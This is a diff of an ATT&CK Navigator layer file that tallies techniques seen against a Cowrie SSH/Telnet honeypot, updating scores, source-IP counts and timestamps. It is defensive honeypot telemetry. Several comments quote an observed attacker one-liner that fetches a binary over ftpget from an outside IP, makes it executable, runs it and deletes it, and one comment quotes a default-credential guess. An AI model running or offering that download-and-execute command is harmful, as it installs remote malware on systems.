@@ -6,7 +6,7 @@
     "layer": "4.5"
   },
   "domain": "enterprise-attack",
-  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-14 02:02:42",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-14 03:01:42",
   "filters": {
     "platforms": [
       "Linux"
@@ -22,9 +22,9 @@
   "techniques": [
     {
       "techniqueID": "T1110.001",
-      "score": 77,
+      "score": 114,
       "enabled": true,
-      "comment": "77 observation(s) from 15 unique IP(s). e.g. dispatch-sjjr / dispatch-sjjr",
+      "comment": "114 observation(s) from 19 unique IP(s). e.g. dispatch-sjjr / dispatch-sjjr",
       "metadata": [
         {
           "name": "tactic",
@@ -32,7 +32,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "15"
+          "value": "19"
         },
         {
           "name": "first seen",
@@ -40,19 +40,67 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-14T02:02:20"
+          "value": "2026-08-14T02:51:41"
         }
       ]
     },
     {
       "techniqueID": "T1222.002",
-      "score": 28,
+      "score": 30,
       "enabled": true,
-      "comment": "28 observation(s) from 3 unique IP(s). e.g. (ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+      "comment": "30 observation(s) from 4 unique IP(s). e.g. (ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
       "metadata": [
         {
           "name": "tactic",
           "value": "Defense Evasion"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "4"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-14T00:00:30"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-14T02:48:09"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1078",
+      "score": 12,
+      "enabled": true,
+      "comment": "12 observation(s) from 10 unique IP(s). e.g. ubuntu / 123456",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Initial Access"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "10"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-14T00:11:55"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-14T02:51:44"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 9,
+      "enabled": true,
+      "comment": "9 observation(s) from 3 unique IP(s). e.g. (ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Command and Control"
         },
         {
           "name": "unique source IPs",
@@ -64,55 +112,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-14T01:41:00"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1078",
-      "score": 7,
-      "enabled": true,
-      "comment": "7 observation(s) from 7 unique IP(s). e.g. ubuntu / 123456",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Initial Access"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "7"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-08-14T00:11:55"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-08-14T01:48:20"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1105",
-      "score": 5,
-      "enabled": true,
-      "comment": "5 observation(s) from 2 unique IP(s). e.g. (ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Command and Control"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "2"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-08-14T00:00:30"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-08-14T01:00:00"
+          "value": "2026-08-14T02:48:10"
         }
       ]
     },
@@ -172,7 +172,7 @@
       "#f85149"
     ],
     "minValue": 0,
-    "maxValue": 77
+    "maxValue": 114
   },
   "legendItems": [
     {
